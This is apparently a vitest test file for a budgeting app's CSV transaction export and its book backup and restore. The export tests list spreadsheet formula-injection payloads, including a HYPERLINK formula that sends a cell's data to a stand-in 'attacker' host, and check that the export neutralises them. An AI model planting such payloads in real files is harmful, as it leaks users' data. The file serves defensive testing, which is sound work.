import { parse as csvParse } from "csv-parse/sync";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { scratch } from "./helpers.ts";

let s: ReturnType<typeof scratch>;
let book: string;
let account: string;
let food: any;
let bills: any;
let folder: string;
beforeEach(async () => {
  s = scratch();
  folder = mkdtempSync(join(tmpdir(), "reeve-export-"));
  book = (await s.call("create_book", { name: "Test" })).id;
  account = (await s.call("create_account", { book, name: "Checking" })).id;
  const groups = await s.call("list_categories", { book });
  food = groups[0].categories.find((c: any) => c.name === "Food");
  bills = groups[0].categories.find((c: any) => c.name === "Bills");
});
afterEach(async () => {
  await s.dispose();
  rmSync(folder, { recursive: true, force: true });
});

const exported = async (input: Record<string, unknown> = {}) =>
  csvParse(await s.call("export_transactions", { book, ...input }), { columns: true }) as Array<
    Record<string, string>
  >;

describe("CSV export", () => {
  const payeeCell = async (payee: string, amount = 10000) => {
    await s.call("create_transaction", { book, account, date: "2026-01-01", amount, payee });
    return (await exported())[0]!;
  };

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ["=1+1"],
    ["+1+1"],
    ["-2+3"],
    ["@SUM(1+1)"],
  ])("prefixes a payee starting with %j with a single quote", async (payload) => {
    expect((await payeeCell(payload)).Payee).toBe(`'${payload}`);
  });

  it("does not prefix payees without a leading trigger character", async () => {
    expect((await payeeCell("Acme Corp")).Payee).toBe("Acme Corp");
  });

  it("does not prefix negative numeric amounts", async () => {
    expect((await payeeCell("Acme", -2500)).Amount).toBe("-25");
  });

  it("writes Actual's columns, splits as a total and their parts", async () => {
    await s.call("create_transaction", {
      book,
      account,
      date: "2026-01-02",
      amount: -4250,
      payee: "Grocer",
      category: food.id,
      notes: "weekly",
      cleared: true,
    });
    await s.call("create_transaction", {
      book,
      account,
      date: "2026-01-03",
      amount: -3000,
      payee: "Store",
      splits: [
        { category: food.id, amount: -1000, memo: "snacks" },
        { category: bills.id, amount: -2000 },
      ],
    });
    const csv = await s.call("export_transactions", { book, account });
    expect(csv.split("\n")[0]).toBe(
      "Account,Date,Payee,Notes,Category_Group,Category,Amount,Split_Amount,Cleared",
    );
    expect(await exported({ account })).toEqual([
      {
        Account: "Checking",
        Date: "2026-01-03",
        Payee: "Store",
        Notes: "(SPLIT INTO 2) ",
        Category_Group: "",
        Category: "",
        Amount: "0",
        Split_Amount: "-30",
        Cleared: "Not cleared",
      },
      {
        Account: "Checking",
        Date: "2026-01-03",
        Payee: "Store",
        Notes: "(SPLIT 1 OF 2) snacks",
        Category_Group: "Usual Expenses",
        Category: "Food",
        Amount: "-10",
        Split_Amount: "0",
        Cleared: "Not cleared",
      },
      {
        Account: "Checking",
        Date: "2026-01-03",
        Payee: "Store",
        Notes: "(SPLIT 2 OF 2) ",
        Category_Group: "Usual Expenses",
        Category: "Bills",
        Amount: "-20",
        Split_Amount: "0",
        Cleared: "Not cleared",
      },
      {
        Account: "Checking",
        Date: "2026-01-02",
        Payee: "Grocer",
        Notes: "weekly",
        Category_Group: "Usual Expenses",
        Category: "Food",
        Amount: "-42.5",
        Split_Amount: "0",
        Cleared: "Cleared",
      },
    ]);
    expect(await exported({ account, from: "2026-01-03" })).toHaveLength(3);
  });
});

describe("book backup", () => {
  it("writes a backup and restores it as a new book", async () => {
    await s.call("create_transaction", {
      book,
      account,
      date: "2026-01-02",
      amount: -4250,
      payee: "Grocer",
      category: food.id,
    });
    await s.call("set_budget", { book, month: "2026-01", category: food.id, amount: 10000 });
    const path = join(folder, "backup.sqlite");
    const written = await s.call("export_book", { book, path });
    expect(written.path).toBe(path);
    expect(written.bytes).toBeGreaterThan(0);

    const restored = await s.call("restore_book", { path });
    expect(restored.id).toBe("test-2");
    expect(restored.settings.name).toBe("Test");
    const page = await s.call("list_transactions", { book: restored.id });
    expect(page.rows.map((row: any) => [row.payee, row.amount])).toEqual([["Grocer", -4250]]);
    const original = await s.call("get_budget", { book, month: "2026-01" });
    const copy = await s.call("get_budget", { book: restored.id, month: "2026-01" });
    expect(copy).toEqual(original);
    expect((await s.call("undo", { book: restored.id })).done).toBe(false);

    const renamed = await s.call("restore_book", { path, name: "Copy" });
    expect(renamed).toMatchObject({ id: "copy", settings: { name: "Copy" } });
  });

  it("refuses to overwrite a file unless asked", async () => {
    const path = join(folder, "backup.sqlite");
    writeFileSync(path, "x");
    expect((await s.fails("export_book", { book, path }))._tag).toBe("InvalidRequest");
    await s.call("export_book", { book, path, overwrite: true });
    expect(existsSync(path)).toBe(true);
  });

  it("refuses a file that is no backup", async () => {
    const path = join(folder, "nope.sqlite");
    writeFileSync(path, "not a database");
    expect((await s.fails("restore_book", { path }))._tag).toBe("InvalidRequest");
    expect((await s.call("list_books")).map((b: any) => b.id)).toEqual(["test"]);
  });
});
